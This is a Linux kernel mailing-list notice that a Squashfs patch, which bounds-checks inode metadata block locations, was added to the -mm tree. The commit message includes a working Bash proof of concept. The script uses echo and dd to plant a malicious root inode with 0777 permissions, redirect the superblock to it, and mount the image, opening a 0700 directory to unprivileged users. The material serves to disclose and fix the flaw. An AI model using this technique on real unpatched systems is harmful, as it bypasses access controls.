Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795586023;
	b=W1xDX1S7V7cHW1xWGKQ3ousiISmVLMQhQr1G3FKmLxkHXxbdXNPaZoEI4nJODyCQpfns
	 Wou3QTY1xB7ehfeuULEccl60BmrRnmXF59ADMX3RtNmEp1/Qk1hyphljekhO9dt6aneuo
	 CPn7lHJ1Bg4rUN9Sld+hfIikq9/sE/yEm+/iUDJMwwfwnxuE2trOgGFCmNBakSsgzA93R
	 I6fiPKKi3XOahNe8RpEde+K2mXYfia5OTda2Pe5SDEzbNXXVaRogunHK5GMzDqoC5ds3R
	 lzhbdRd5f26KiiU6HV3n8mZYMsayu+iUZ8LWntqqbr6qCNaT6eVejY1ipSG4isQB+Jg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795586023;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=h2RdfPfqnducR/D9dorRhvk5mU+WKXs+AbyllHyJuBE=;
	b=ZD4vr1ZbLEbB3PuLTqLNKg+VSBD+IdH6ABG70l2pNVqybF6AUI9gDsV2A2J/jYCkACGx
	 e33Zc6Rj2X2XRcaZf7xfkZ+Bf0n14yldu9AC99GP9srWijzhOdE0zVI3Dl0iT9ZmrRPAq
	 1YZVg5av4kFkIqYOmIFZyhPID06HglgdJf5/zHyaV6Ztlex4jGN1TXnV5QNKPRS0Zttx1
	 Hh4Y7PLCVLMrOc2Xvg7LWkAOezcrOboP7RjZeKZsF0Ah36HLQuBfsE6aMhiN9bb0N2/0M
	 IJcrIJZfxTnU5XHBwFkg+6OwyqYkfxhrgk9+t6Ln1M3blgHmeBFGs4ctJpBhPjys6tg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b="bU/LJ+Ff";
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 73DD4606A31E
	for <mm-commits@vger.kernel.org>; Wed, 25 Nov 2026 05:53:43 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=bU/LJ+Ff
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 37AF11F000C0;
	Wed, 25 Nov 2026 05:53:43 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795586023;
	bh=h2RdfPfqnducR/D9dorRhvk5mU+WKXs+AbyllHyJuBE=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=bU/LJ+FfjPYh+1Xxf/+ONS2/odmOdopJvJmNKDvf1Tem1YWj5ESIP5mgRNNAEl4it
	 0/DkyB4+8psssXZq3O0/+3yW6HSKMBGTTvZLz3vA4mrFT5s2qj8Hi7H/RWHOdoAouH
	 IJltLsDZwsPdT8ej8lRB2SEstBwrQfkX7hdQ57Js=
Date: Tue, 24 Nov 2026 21:53:42 -0800
To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
	akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261125014737.347231-12-phillip@squashfs.org.uk>
References: <20261125014737.347231-12-phillip@squashfs.org.uk>
Subject: + squashfs-sanity-check-inode-metadata-block-location.patch added to mm-nonmm-unstable branch
Message-Id: <20261125055343.37AF11F000C0@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The patch titled
     Subject: Squashfs: sanity check inode metadata block location
has been added to the -mm mm-nonmm-unstable branch.  Its filename is
     squashfs-sanity-check-inode-metadata-block-location.patch

This patch will shortly appear at
     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-sanity-check-inode-metadata-block-location.patch

This patch will later appear in the mm-nonmm-unstable branch at
    git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm

Before you just go and hit "reply", please:
   a) Consider who else should be cc'ed
   b) Prefer to cc a suitable mailing list as well
   c) Ideally: find the original patch on the mailing list and do a
      reply-to-all to that, adding suitable additional cc's

*** Remember to use Documentation/process/submit-checklist.rst when testing your code ***

The -mm tree is included into linux-next via various
branches at git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
and is updated there most days

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: sanity check inode metadata block location
Date: Wed, 25 Nov 2026 01:47:25 +0000

An inode reference in Squashfs is represented as a tuple, the location
of the compressed metadata block the inode is in, and the offset into
the uncompressed block.  The location is not absolute and it is instead
encoded as an offset from the start of the inode table.

An attacker could manipulate the inode reference to make it point to a
replacement malicious inode stored elsewhere, outside the inode table.
This is because the code does not check that the location is valid and
is within the inode table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to hide a malicious inode.

Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliberately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem root directory has
permissions 0700 (u=rxw), where only the superuser can enter the
directory and access the content within. But using this bug an attacker
could place a malicious root inode in the inode lookup table (used by
NFS) which has the permissions changed to 0777 (a=rwx), and then update
the root_inode field in the superblock to point to that.  On
reboot/remount this will make the directory accesisible to unprivileged
users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_inode_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the inode is within the inode table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the root directory
permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
is unchanged.

======================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
for i in $(seq 1 100); do
	echo "$i l zero" >> pseudo
done

# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# The root_inode field in the superblock points to the compressed metadata
# block and offset within it, where the root inode is stored.
#
# Create a malicious root inode and hide it in the inode lookup table.
# Because of mount time checking, there are no gaps between metadata tables
# where it can be hidden, and it can't be hidden after the file system end,
# because this is checked.

# Write malicious inode, this is the same as the original root inode, except
# it is uncompressed, and the permissions are set to 0777.
/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
\x00" > file

# Place new root inode inside the inode lookup table
echo Place new root inode inside the inode lookup table

dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new inode
# The start block is an offset from the inode_table_start, and not an
# absolute value.  The start of the inode table is 113, the new inode
# is placed at position 964, and so the offset is 851. Because we've only
# stored one inode in the metadata block, the offset into that block is 0.
#
echo Update the root_inode field in the superblock to point to our new inode

/usr/bin/echo -en "\x00\x00\x4f\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt, if the exploit is successful, permissions should be 0777
echo Stat /mnt, if the exploit is successful, permissions should be 0777

stat /mnt

popd 2>&1> /dev/null

rm -rf $DIR
======================================================================

Link: https://patch.msgid.link/20261125014737.347231-12-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>

 fs/squashfs/inode.c            |   17 ++++++++++-------
 fs/squashfs/squashfs_helpers.h |   18 ++++++++++++++++++
 2 files changed, 28 insertions(+), 7 deletions(-)

--- a/fs/squashfs/inode.c~squashfs-sanity-check-inode-metadata-block-location
+++ a/fs/squashfs/inode.c
@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *in
 {
 	struct super_block *sb = inode->i_sb;
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
-	int offset = squashfs_inode_offset(ino);
+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
+	int offset = squashfs_inode_offset(ino), soffset = offset;
 	int err, type;
 	union squashfs_inode squashfs_ino;
 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
@@ -118,11 +118,14 @@ int squashfs_read_inode(struct inode *in
 
 	TRACE("Entered squashfs_read_inode\n");
 
+	if (block < 0)
+		goto bad_block_val;
+
 	/*
 	 * Read inode base common to all inode types.
 	 */
-	err = squashfs_read_metadata(sb, sqshb_ino, &block,
-				&offset, sizeof(*sqshb_ino));
+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
+				&soffset, sizeof(*sqshb_ino));
 	if (err < 0)
 		goto failed_read;
 
@@ -130,9 +133,6 @@ int squashfs_read_inode(struct inode *in
 	if (err)
 		goto failed_read;
 
-	block = squashfs_inode_blk(ino) + msblk->inode_table;
-	offset = squashfs_inode_offset(ino);
-
 	type = le16_to_cpu(sqshb_ino->inode_type);
 	switch (type) {
 	case SQUASHFS_REG_TYPE: {
@@ -464,6 +464,9 @@ int squashfs_read_inode(struct inode *in
 
 	return 0;
 
+bad_block_val:
+	err = block;
+
 failed_read:
 	ERROR("Unable to read inode 0x%llx\n", ino);
 	return err;
--- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-inode-metadata-block-location
+++ a/fs/squashfs/squashfs_helpers.h
@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(
 	return inode & 0xffff;
 }
 
+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
+{
+	s64 start;
+
+	if (inode < 0)
+		return -EINVAL;
+
+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
+		return -EINVAL;
+
+	start = msblk->inode_table + squashfs_inode_blk(inode);
+
+	if (start >= msblk->directory_table)
+		return -EINVAL;
+
+	return start;
+}
+
 static inline s64 squashfs_mkinode(u32 start, u16 offset)
 {
 	return ((s64)start << 16) | offset;
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-convert-squashfs_compressed_-to-inline-functions.patch
squashfs-convert-squashfs_inode_-and-squashfs_mkinode-to-inline-functions.patch
squashfs-convert-squashfs_fragment_-to-inline-functions.patch
squashfs-convert-squashfs_lookup_-to-inline-functions.patch
squashfs-convert-squashfs_id_-to-inline-functions.patch
squashfs-convert-squashfs_xattr_-to-inline-functions.patch
squashfs-fix-offset-in-squashfs_read_inode-trace-statements.patch
squashfs-dont-compute-start-or-alloc-memory-on-empty-directory-or-index.patch
squashfs-fix-fragment-bytes-overflow-on-32-bit-architectures.patch
squashfs-fix-fragment-index-table-length-too-large-exploit.patch
squashfs-sanity-check-inode-metadata-block-location.patch
squashfs-sanity-check-directory-metadata-block-location.patch
squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-or-size_t.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch

